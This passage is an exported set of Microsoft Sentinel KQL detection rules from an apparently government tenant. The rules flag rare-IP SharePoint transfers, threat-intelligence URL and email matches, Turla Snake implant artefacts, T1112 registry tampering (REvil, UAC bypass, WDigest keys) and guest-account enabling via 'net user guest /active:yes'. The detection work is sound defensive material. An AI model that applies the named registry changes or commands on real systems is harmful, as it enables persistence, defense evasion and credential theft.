needed\r\nlet szOperations = dynamic([\"FileDownloaded\", \"FileUploaded\"]); //can add other Operations as needed\r\nlet starttime = 14d; //returns 14 days of records from the OfficeActivity table that do not match any record that the system has seen previously (Looks for rareIPs)\r\nlet InvestigationPriorityThreshold = 1;\r\nlet allowList =\r\n    toscalar(\r\n    (externaldata(BCAP: string)[@\"https://dod365csspstorage.blob.core.usgovcloudapi.net/ueba/ip.csv\"] with (format=\"csv\", ignoreFirstRecord=True))\r\n    | summarize make_list(BCAP)); //whitelist\r\nlet RareActivity =\r\n    OfficeActivity\r\n    | where TimeGenerated >= ago(starttime)\r\n    | where RecordType == szSharePointFileOperation\r\n    | where Operation in (szOperations)\r\n    | where not(ipv4_is_in_any_range(ClientIP, allowList)) //checks against allowList (whitelist)\r\n    | summarize\r\n        StartTime = min(Start_Time),\r\n        EndTime=max(Start_Time),\r\n        recentCount = count(),\r\n        UserId=any(UserId)\r\n        by\r\n        ClientIP,\r\n        RecordType,\r\n        Operation,\r\n        UserType,\r\n        OfficeWorkload,\r\n        Site_Url,\r\n        OfficeObjectId,\r\n        UserAgent\r\n    | where StartTime >= ago(1h)\r\n    // More than 50 downloads/uploads from a new IP\r\n    | where recentCount > threshold;\r\n//RareActivity\r\n//joins with UEBA tables (IdentityInfo + BehaviorAnalytics)\r\nlet RareIdentity =\r\n    RareActivity\r\n    | join kind=innerunique (IdentityInfo\r\n        | where TimeGenerated >= ago(starttime)\r\n        | where AccountUPN !has \"disable\"\r\n        | extend DepartmentCode = tostring(split(split(Department, ' ')[0], '-')[0]))\r\n        on $left.UserId == $right.AccountUPN\r\n        | where (Site_Url) !contains DepartmentCode//Site Validation \r\n        | extend UserIdSyntax = replace_string(replace_string(UserId, '.', '_'), \"@\", \"_\") //ignore personal accounts\r\n        | where (Site_Url) !contains (UserIdSyntax)\r\n    | project\r\n        tostring(AccountDisplayName),\r\n        UserId=tostring(AccountUPN),\r\n        StartTime,\r\n        DepartmentCode,\r\n        GroupMembership,\r\n        State,\r\n        City,\r\n        Country,\r\n        Department,\r\n        JobTitle,\r\n        AssignedRoles,\r\n        ClientIP,\r\n        RecordType,\r\n        Operation,\r\n        UserType,\r\n        App=OfficeWorkload,\r\n        Site_Url,\r\n        OfficeObjectId,\r\n        UserAgent,\r\n        recentCount\r\n    | distinct\r\n        tostring(AccountDisplayName),\r\n        UserId,\r\n        tostring(GroupMembership),\r\n        TimeGenerated=StartTime,\r\n        State,\r\n        City,\r\n        Country,\r\n        Department,\r\n        JobTitle,\r\n        tostring(AssignedRoles),\r\n        ClientIP,\r\n        RecordType,\r\n        Operation,\r\n        UserType,\r\n        App,\r\n        Site_Url,\r\n        OfficeObjectId,\r\n        UserAgent,\r\n        recentCount,\r\n        tostring(DepartmentCode);\r\nBehaviorAnalytics\r\n| where TimeGenerated >= ago(30d)\r\n| where InvestigationPriority >= InvestigationPriorityThreshold//ADJUST\r\n| project InvestigationPriority, ActivityInsights, UserId= UserPrincipalName\r\n| join kind=innerunique RareIdentity\r\n    on $left.UserId == $right.UserId\r\n| evaluate bag_unpack(ActivityInsights, columnsConflict=\"replace_source\")\r\n| extend ActionUncommonlyPerformedByUser = column_ifexists(\"ActionUncommonlyPerformedByUser\", \"\")\r\n| extend UncommonHighVolumeOfActions = column_ifexists(\"UncommonHighVolumeOfActions\", \"\")\r\n| extend Resource = column_ifexists(\"Resource\", \"\")\r\n//| where ActionUncommonlyPerformedByUser == True\r\n//| where UncommonHighVolumeOfActions == True\r\n| project-away UserId1, Resource\r\n| project-reorder TimeGenerated, AccountDisplayName, UserId, GroupMembership","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5M","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"ClientIP"}]},{"entityType":"Account","fieldMappings":[{"identifier":"AadUserId","columnName":"UserId"}]},{"entityType":"URL","fieldMappings":[{"identifier":"Url","columnName":"Site_Url"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":[],"techniques":[],"displayName":"BAH_UEBA_5-SharePointFileOperation","enabled":true,"description":"Looks at sharepoint file operations targeting users specific uploads and downloads of files exceeding 50 threshold on an unseen IP and Identifies when the volume of documents uploaded to or downloaded from Sharepoint by new IP addresses exceeds a threshold (default is 50).","alertRuleTemplateName":null,"lastModifiedUtc":"2023-08-22T12:44:06.4413972Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/a92f22c7-b9bc-465e-ba10-5889e7eba751","name":"a92f22c7-b9bc-465e-ba10-5889e7eba751","etag":"\"760815f4-0000-2700-0000-66295a6f0000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT1H","queryPeriod":"P14D","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"let dt_lookBack = 1h;\nlet ioc_lookBack = 14d;\nlet AuditEvents = materialize(AuditLogs\n  | where TimeGenerated >= ago(dt_lookBack)\n  // Extract the URL that is contained within the JSON data\n  | extend Url = extract(\"(http[s]?://(?:[a-zA-Z]|[0-9]|[$-_@.&+]|[!*\\\\(\\\\),]|(?:%[0-9a-fA-F][0-9a-fA-F]))+);\", 1,tostring(TargetResources))\n  | where isnotempty(Url)\n  | extend userPrincipalName = tostring(parse_json(tostring(InitiatedBy.user)).userPrincipalName)\n  | extend TargetResourceDisplayName = tostring(TargetResources[0].displayName)\n  | extend Audit_TimeGenerated = TimeGenerated);\nlet AuditUrls = AuditEvents | distinct Url = tolower(Url) | summarize make_list(Url);\nThreatIntelligenceIndicator\n| where isnotempty(Url)\n| where TimeGenerated >= ago(ioc_lookBack)\n| where tolower(Url) in (AuditUrls)\n| summarize LatestIndicatorTime = arg_max(TimeGenerated, *) by IndicatorId\n| where Active == true and ExpirationDateTime > now()\n| where Description !contains_cs \"State: inactive;\" and Description !contains_cs \"State: falsepos;\"\n// using innerunique to keep perf fast and result set low, we only need one match to indicate potential malicious activity that needs to be investigated\n| join kind=innerunique (AuditEvents) on Url\n| where Audit_TimeGenerated < ExpirationDateTime\n| summarize Audit_TimeGenerated = arg_max(Audit_TimeGenerated, *) by IndicatorId, Url\n| project Audit_TimeGenerated, Description, ActivityGroupNames, IndicatorId, ThreatType, ExpirationDateTime, ConfidenceScore,\nOperationName, Identity, userPrincipalName, TargetResourceDisplayName, Url\n| extend AccountName = tostring(split(userPrincipalName, \"@\")[0]), AccountUPNSuffix = tostring(split(userPrincipalName, \"@\")[1])\n| extend HostName = tostring(split(TargetResourceDisplayName, \".\")[0]), DomainIndex = toint(indexof(TargetResourceDisplayName, '.'))\n| extend HostNameDomain = iff(DomainIndex != -1, substring(TargetResourceDisplayName, DomainIndex + 1), TargetResourceDisplayName)\n","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"userPrincipalName"},{"identifier":"Name","columnName":"AccountName"},{"identifier":"UPNSuffix","columnName":"AccountUPNSuffix"}]},{"entityType":"Host","fieldMappings":[{"identifier":"FullName","columnName":"TargetResourceDisplayName"},{"identifier":"HostName","columnName":"HostName"},{"identifier":"DnsDomain","columnName":"HostNameDomain"}]},{"entityType":"URL","fieldMappings":[{"identifier":"Url","columnName":"Url"}]}],"templateVersion":"1.2.6","eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["Impact"],"techniques":[],"displayName":"TI Map URL Entity to AuditLogs","enabled":true,"description":"This query identifies any URL indicators of compromise (IOCs) from threat intelligence (TI) by searching for matches in AuditLogs.","alertRuleTemplateName":"712fab52-2a7d-401e-a08c-ff939cc7c25e","lastModifiedUtc":"2024-04-24T19:15:57.7449896Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/17fe0658-a86d-4179-8266-f036b44f839b","name":"17fe0658-a86d-4179-8266-f036b44f839b","etag":"\"8700a8ad-0000-2700-0000-66fdc7010000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT1H","queryPeriod":"PT1H","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"High","query":"// Author: Rob Russell, Mike Gibbs\r\n// Description:\r\n// Looks for Snake implant related behavior based on cisa advisory aa23-129a\r\n// https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-129a\r\n// https://blogs.vmware.com/security/2017/08/threat-analysis-carbon-black-threat-research-dissects-png-dropper.html\r\n// https://gist.github.com/tjnary/4272b17ef6debcba9e85fd8159be4591\r\n// False Positives: no known false positives\r\nlet InstallerNames = dynamic([\"jpsetup.exe\", \"jpinst.exe\"]);\r\nlet signInLookup = (\r\nSigninLogs\r\n| where TimeGenerated >= ago(1d) \r\n| where DeviceDetail contains \"displayName\"\r\n| extend DeviceDetailJson = parse_json(DeviceDetail)\r\n| extend DeviceNameSI = tostring(DeviceDetailJson.displayName)\r\n| distinct DeviceNameSI, UserPrincipalName, UserDisplayName\r\n);\r\n(union isfuzzy=True\r\n    (\r\n    DeviceFileEvents\r\n    | where (ActionType == \"FileCreated\" and \r\n            FileName == \"comadmin.dat\" and \r\n            FolderPath contains @\"\\system32\\Com\")\r\n            | extend SILogDeviceName = toupper((split(DeviceName, \".\"))[0])\r\n            | join kind=leftouter signInLookup on $left.SILogDeviceName == $right.DeviceNameSI\r\n    | project TimeGenerated, DeviceName, UserPrincipalName, RequestAccountName, FolderPath, Tactic = \"Snake Kernel Driver and Custom Loader\"\r\n    ),(\r\n    DeviceRegistryEvents\r\n    | where ActionType in (\"RegistryKeyCreated\", \"RegistryValueSet\")\r\n    | where RegistryKey endswith @\"\\Classes\\.wav\\OpenWithProgIds\"\r\n    | extend SILogDeviceName = toupper((split(DeviceName, \".\"))[0])\r\n    | join kind=leftouter signInLookup on $left.SILogDeviceName == $right.DeviceNameSI\r\n    | project TimeGenerated, DeviceName, UserPrincipalName, InitiatingProcessAccountName, ActionType, RegistryKey, Tactic = \"Snake Malware via OpenWithProgIds Registry Creation\"\r\n    ),(\r\n    DeviceRegistryEvents\r\n    | where ActionType in (\"RegistryKeyCreated\", \"RegistryValueSet\")\r\n    | where RegistryKey endswith  @\"SECURITY\\Policy\\Secrets\\n\"\r\n    | extend SILogDeviceName = toupper((split(DeviceName, \".\"))[0])\r\n    | join kind=leftouter signInLookup on $left.SILogDeviceName == $right.DeviceNameSI\r\n    | project TimeGenerated, DeviceName, UserPrincipalName, InitiatingProcessAccountName, ActionType, RegistryKey, Tactic = \"Snake Malware via Covert Store Registry Key\"\r\n    ),(\r\n    union isfuzzy=true\r\n        (\r\n        union withsource=TableName Device*\r\n        | where FileName has_any (InstallerNames) or \r\n                PreviousFileName has_any (InstallerNames) or\r\n                InitiatingProcessFileName has_any (InstallerNames) or\r\n                InitiatingProcessParentFileName has_any (InstallerNames)\r\n        | extend SILogDeviceName = toupper((split(DeviceName, \".\"))[0])\r\n        | join kind=leftouter signInLookup on $left.SILogDeviceName == $right.DeviceNameSI\r\n        )\r\n    | project TimeGenerated, DeviceName, UserPrincipalName, AccountName, FileName, PreviousFileName, InitiatingProcessFileName, InitiatingProcessParentFileName, Tactic = \"Possible Turla Snake Malware Installer\"\r\n    ),(\r\n    union isfuzzy=true\r\n        (\r\n        union withsource=TableName Device*\r\n        | where (FolderPath contains @\"\\Windows\\Registration\\\" and FolderPath endswith @\".crmlog\") or\r\n                (InitiatingProcessFolderPath contains @\"\\Windows\\Registration\\\" and InitiatingProcessFolderPath endswith @\".crmlog\")\r\n        | extend SILogDeviceName = toupper((split(DeviceName, \".\"))[0])\r\n        | join kind=leftouter signInLookup on $left.SILogDeviceName == $right.DeviceNameSI\r\n        )\r\n    | project TimeGenerated, DeviceName, UserPrincipalName, AccountName, FolderPath, InitiatingProcessFolderPath, Tactic = \"Snake Malware via Queue File Creation\"\r\n    ),(\r\n    DeviceEvents\r\n    | where ActionType == \"ServiceInstalled\"\r\n    | extend ServiceName = AdditionalFields.ServiceName\r\n    | where ServiceName contains \"WerFaultSvc\"\r\n    | extend SILogDeviceName = toupper((split(DeviceName, \".\"))[0])\r\n    | join kind=leftouter signInLookup on $left.SILogDeviceName == $right.DeviceNameSI\r\n    | project TimeGenerated, DeviceName, UserPrincipalName, AccountName, ServiceName, ServiceDetails = tostring(AdditionalFields), FileName, MD5, Tactic = \"Snake Malware via WerFaultSvc Service Creation\"\r\n    )\r\n)","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5M","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"customDetails":{"Snake_Behavior":"Tactic"},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"Name","columnName":"UserPrincipalName"}]},{"entityType":"Host","fieldMappings":[{"identifier":"HostName","columnName":"DeviceName"}]},{"entityType":"File","fieldMappings":[{"identifier":"Name","columnName":"FileName"},{"identifier":"Directory","columnName":"FolderPath"}]},{"entityType":"RegistryKey","fieldMappings":[{"identifier":"Key","columnName":"RegistryKey"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["Persistence","Execution","InitialAccess","DefenseEvasion"],"techniques":["T1547","T1204","T1059","T1078","T1112","T1562"],"displayName":"BAH_SnakeImplant","enabled":true,"description":"Looks for Snake implant related behavior based on cisa advisory aa23-129a                                                                                                                                                                                                                                               \nhttps://www.cisa.gov/news-events/cybersecurity-advisories/aa23-129a\n https://blogs.vmware.com/security/2017/08/threat-analysis-carbon-black-threat-research-dissects-png-dropper.html\n https://gist.github.com/tjnary/4272b17ef6debcba9e85fd8159be4591\nPLATFORM:Windows\nMITRE:TA0002;T1012,TA0005;T1027;T1027.002;T1112;T1543;T1547,TA0011;T1573;T1573.001;T1573;T1573.002","alertRuleTemplateName":null,"lastModifiedUtc":"2024-10-02T22:19:44.3704273Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/02b671b9-f034-46cd-8d59-d7b2f04be96e","name":"02b671b9-f034-46cd-8d59-d7b2f04be96e","etag":"\"87000da7-0000-2700-0000-66fdc6820000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT1H","queryPeriod":"PT1H","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"\r\n//Title: BAH_T1112Activity\r\n//Description: Looks for common registry keys and commands relatated to MITRE technique T1112\r\n//https://attack.mitre.org/techniques/T1112/\r\n//https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1112/T1112.md\r\n//Author: Mike Gibbs, Rob Russell\r\nlet signInLookup = (\r\nSigninLogs\r\n| where TimeGenerated >= ago(1d)\r\n| where DeviceDetail contains \"displayName\"\r\n| extend DeviceDetailJson = parse_json(DeviceDetail)\r\n| extend DeviceNameSI = tostring(DeviceDetail.displayName)\r\n| distinct DeviceNameSI, UserPrincipalName, UserDisplayName\r\n);\r\nlet RegKeysToSearch = dynamic([@\"Software\\Classes\\.wav\\OpenWithProgIds\", \r\n                               @\"Software\\Wow6432Node\\Facebook_Assistant\",\r\n                               @\"Software\\Wow6432Node\\BlackLivesMatter\",\r\n                               @\"Software\\Classes\\ms-settings\\shell\\open\\command\",\r\n                               @\"Software\\Firm\\Soft\",\r\n                               @\"Software\\Wow6432Node\\Facebook_Assistant\",\r\n                               @\"Security\\Policy\\Secrets\\n\"]); //Revil Ransomware , Snake Malware and fodhelper UAC bypass win10+, Hive Ransomware\r\nlet RegExeKeysToSearch = dynamic([@\"AppDataLow\\Software\\Microsoft\", \r\n                                  @\"Policies\\Microsoft\\Windows\\OOBE\",\r\n                                  @\"Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\",\r\n                                  @\"SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon\",\r\n                                  @\"\\CurrentControlSet\\Control\\SecurityProviders\\WDigest\",\r\n                                  @\"Microsoft\\Windows Defender\",\r\n                                  @\"Software\\Classes\\.wav\\OpenWithProgIds\",\r\n                                  @\"Software\\Wow6432Node\\Facebook_Assistant\",\r\n                                  @\"Software\\Wow6432Node\\BlackLivesMatter\",\r\n                                  @\"Software\\Classes\\ms-settings\\shell\\open\\command\",\r\n                                  @\"Security\\Policy\\Secrets\\\"]);  //turla\r\nsearch in (DeviceRegistryEvents, DeviceProcessEvents)*\r\n| where (\r\n((RegistryKey has_any (RegKeysToSearch))) \r\nor\r\n((RegistryKey endswith @\"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\UMe\" or \r\nRegistryKey endswith @\"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\UT\")) \r\nor\r\n((RegistryKey contains @\"SOFTWARE\\Microsoft\\Active Setup\\Installed Components\" and RegistryKey endswith @\"\\StubPath\"))\r\nor \r\n((InitiatingProcessFolderPath endswith @\"reg.exe\") and \r\n(InitiatingProcessCommandLine has_any (RegExeKeysToSearch))))\r\n| extend SILogDeviceName = toupper((split(DeviceName, \".\"))[0])\r\n| join kind=leftouter signInLookup on $left.SILogDeviceName == $right.DeviceNameSI\r\n| project TimeGenerated, DeviceName, UserPrincipalName, RegistryKey, InitiatingProcessFileName, Reference = \"https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1112/T1112.md\"","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5M","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":null,"groupByCustomDetails":null}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"UserPrincipalName"}]},{"entityType":"Host","fieldMappings":[{"identifier":"FullName","columnName":"DeviceName"}]},{"entityType":"RegistryKey","fieldMappings":[{"identifier":"Key","columnName":"RegistryKey"}]},{"entityType":"URL","fieldMappings":[{"identifier":"Url","columnName":"Reference"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["DefenseEvasion"],"techniques":["T1112"],"displayName":"BAH_T1112ModifyRegistry","enabled":true,"description":"Looks for common registry keys and commands relatated to MITRE Technique T1112\nPLATFORM:Windows\nMITRE:TA0005;T1112","alertRuleTemplateName":null,"lastModifiedUtc":"2024-10-02T22:17:37.6751524Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/5e0e830b-2871-4aee-b4e9-b6faf8591b36","name":"5e0e830b-2871-4aee-b4e9-b6faf8591b36","etag":"\"10027f16-0000-2700-0000-647632e20000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"P1D","queryPeriod":"P14D","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"AzureActivity\n| where OperationNameValue contains \"Microsoft.SecurityInsights/dataConnectors/\"\n| where ActivityStatusValue == \"Succeeded\"\n| project OperationNameValue, Caller, CallerIpAddress, ActivityStatusValue, ActivitySubstatusValue, ResourceGroup, Properties, ResourceId, TimeGenerated\n| sort by TimeGenerated desc\n| extend Account = Caller\n","suppressionDuration":"PT1H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":true,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"AzureResource","fieldMappings":[{"identifier":"ResourceId","columnName":"ResourceId"}]}],"templateVersion":"1.0.0","eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["Discovery"],"techniques":["T1082"],"displayName":"M2131_DataConnectorAddedChangedRemoved","enabled":false,"description":"This alert is designed to monitor data connector configurations. This alert is triggered when a data connector is added, updated, or deleted.","alertRuleTemplateName":"eeb11b6b-e626-4228-b74d-3e730dca8999","lastModifiedUtc":"2023-05-30T17:31:14.8718456Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/b7209b00-64fa-4ac7-8c28-443460f3e579","name":"b7209b00-64fa-4ac7-8c28-443460f3e579","etag":"\"8500c9dc-0000-2700-0000-66fdac170000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT1H","queryPeriod":"P14D","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"let dt_lookBack = 1h;\n let ioc_lookBack = 14d;\n ThreatIntelligenceIndicator\n// Picking up only IOC's that contain the entities we want\n | where isnotempty(Url)\n | where TimeGenerated >= ago(ioc_lookBack)\n | summarize LatestIndicatorTime = arg_max(TimeGenerated, *) by IndicatorId\n | where Active == true and ExpirationDateTime > now()\n // using innerunique to keep perf fast and result set low, we only need one match to indicate potential malicious activity that needs to be investigated\n | join kind=innerunique (\n OfficeActivity\n | where TimeGenerated >= ago(dt_lookBack)\n //Extract the Url from a number of potential fields\n | extend Url = iif(OfficeWorkload == \"AzureActiveDirectory\",extract(\"(http[s]?://(?:[a-zA-Z]|[0-9]|[$-_@.&+]|[!*\\\\(\\\\),]|(?:%[0-9a-fA-F][0-9a-fA-F]))+);\", 1,ModifiedProperties),tostring(parse_json(ModifiedProperties)[12].NewValue))\n | where isnotempty(Url)\n // Ensure we get a clean URL\n | extend Url = tostring(split(Url, ';')[0])\n | extend OfficeActivity_TimeGenerated = TimeGenerated\n// // Project a single user identity that we can use for entity mapping\n | extend User = iif(isnotempty(UserId), UserId, iif(isnotempty(Actor), tostring(parse_json(Actor)[0].ID), tostring(parse_json(Parameters)[0].Value)))\n ) on Url\n | where OfficeActivity_TimeGenerated < ExpirationDateTime\n | summarize OfficeActivity_TimeGenerated = arg_max(OfficeActivity_TimeGenerated, *) by IndicatorId, Url\n | project OfficeActivity_TimeGenerated, Description, ActivityGroupNames, IndicatorId, ThreatType, ExpirationDateTime, ConfidenceScore, Operation,\n UserType, OfficeWorkload, Parameters, Url, User\n | extend timestamp = OfficeActivity_TimeGenerated, Name = tostring(split(User, '@', 0)[0]), UPNSuffix = tostring(split(User, '@', 1)[0]) //datatable() []\n","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"User"},{"identifier":"Name","columnName":"Name"},{"identifier":"UPNSuffix","columnName":"UPNSuffix"}]},{"entityType":"URL","fieldMappings":[{"identifier":"Url","columnName":"Url"}]}],"templateVersion":"1.2.7","eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["Impact"],"techniques":[],"displayName":"TI Map URL Entity to OfficeActivity Data [Deprecated]","enabled":false,"description":"This query is Deprecated as its filter conditions will never yield results. This query identifies any URL indicators of compromise (IOCs) from threat intelligence (TI) by searching for matches in OfficeActivity data.\nPLATFORM:Microsoft 365,IaaS\nMITRE:TA0001;T1566;T1566.002","alertRuleTemplateName":"36a9c9e5-3dc1-4ed9-afaa-1d13617bfc2b","lastModifiedUtc":"2024-10-02T20:24:55.4740744Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/667c7b68-ad98-4a95-93d6-b6f0f0217b69","name":"667c7b68-ad98-4a95-93d6-b6f0f0217b69","etag":"\"7608a462-0000-2700-0000-662959cb0000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT1H","queryPeriod":"P14D","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"let dt_lookBack = 1h;\nlet ioc_lookBack = 14d;\nlet emailregex = @'^[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\\.[a-zA-Z0-9-.]+$';\nThreatIntelligenceIndicator\n//Filtering the table for Email related IOCs\n| where isnotempty(EmailSenderAddress)\n| where TimeGenerated >= ago(ioc_lookBack)\n| summarize LatestIndicatorTime = arg_max(TimeGenerated, *) by IndicatorId\n| where Active == true and ExpirationDateTime > now()\n// using innerunique to keep perf fast and result set low, we only need one match to indicate potential malicious activity that needs to be investigated\n| join kind=innerunique (\n    AzureActivity | where TimeGenerated >= ago(dt_lookBack) and isnotempty(Caller)\n    | extend Caller = tolower(Caller)\n    | where Caller matches regex emailregex\n    | extend AzureActivity_TimeGenerated = TimeGenerated\n)\non $left.EmailSenderAddress == $right.Caller\n| where AzureActivity_TimeGenerated < ExpirationDateTime\n| summarize AzureActivity_TimeGenerated = arg_max(AzureActivity_TimeGenerated, *) by IndicatorId, Caller\n| project AzureActivity_TimeGenerated, Description, ActivityGroupNames, IndicatorId, ThreatType, ExpirationDateTime, ConfidenceScore, Url, EmailSenderName, EmailRecipient,\nEmailSourceDomain, EmailSourceIpAddress, EmailSubject, FileHashValue, FileHashType, Caller, Level, CallerIpAddress, CategoryValue, OperationNameValue, ActivityStatusValue,\nResourceGroup, SubscriptionId\n| extend Name = tostring(split(Caller, '@', 0)[0]), UPNSuffix = tostring(split(Caller, '@', 1)[0])\n| extend timestamp = AzureActivity_TimeGenerated\n","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"Caller"},{"identifier":"Name","columnName":"Name"},{"identifier":"UPNSuffix","columnName":"UPNSuffix"}]},{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"CallerIpAddress"}]},{"entityType":"URL","fieldMappings":[{"identifier":"Url","columnName":"Url"}]}],"templateVersion":"1.2.6","eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["Impact"],"techniques":[],"displayName":"TI map Email entity to AzureActivity","enabled":true,"description":"Identifies a match in AzureActivity table from any Email IOC from TI","alertRuleTemplateName":"cca3b4d9-ac39-4109-8b93-65bb284003e6","lastModifiedUtc":"2024-04-24T19:13:15.0802719Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/f02ba742-33b0-470c-b6d8-e351ac2f42d6","name":"f02ba742-33b0-470c-b6d8-e351ac2f42d6","etag":"\"870008de-0000-2700-0000-66fdca6a0000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT1H","queryPeriod":"PT1H","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"//Title: BAH_GuestAccountEnabled\n//Description: Detects for the built-in Windows guest account being enabled. The guest account could potentially be used to perform malicious activities on a device such as installing malware, deleting files, or data exfiltration.\n//Author: Steven Wan\n//False Positives: None applicable at this time.\n\nlet signInLookup = (\nSigninLogs\n| where TimeGenerated >= ago(1d)\n| where DeviceDetail contains \"displayName\"\n| extend DeviceDetailJson = parse_json(DeviceDetail)\n| extend DeviceNameSI = tostring(DeviceDetailJson.displayName)\n| distinct DeviceNameSI, UserPrincipalName, UserDisplayName\n);\nDeviceProcessEvents\n| where (InitiatingProcessCommandLine contains \"user guest /active:yes\" and (FileName == \"net1.exe\" or FileName == \"net.exe\"))\n| extend SILogDeviceName = toupper((split(DeviceName, \".\"))[0]) // for signin lookup by device will find last user signed into device if it was in the last 24 hours\n| join kind=leftouter signInLookup on $left.SILogDeviceName == $right.DeviceNameSI // this join will add UserPrincipalName from here forward based on device name\n| project TimeGenerated, UserPrincipalName, AccountName, DeviceId, DeviceName, ActionType, FileName, InitiatingProcessCommandLine, ProcessCommandLine","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5M","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":null,"groupByCustomDetails":null}},"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["InitialAccess"],"techniques":["T1078"],"displayName":"BAH_GuestAccountEnabled","enabled":true,"description":"Detects for the built-in Windows guest account being enabled. The guest account could potentially be used to perform malicious activities on a device such as installing malware, deleting files, or data exfiltration.\nPLATFORM:Windows,Azure 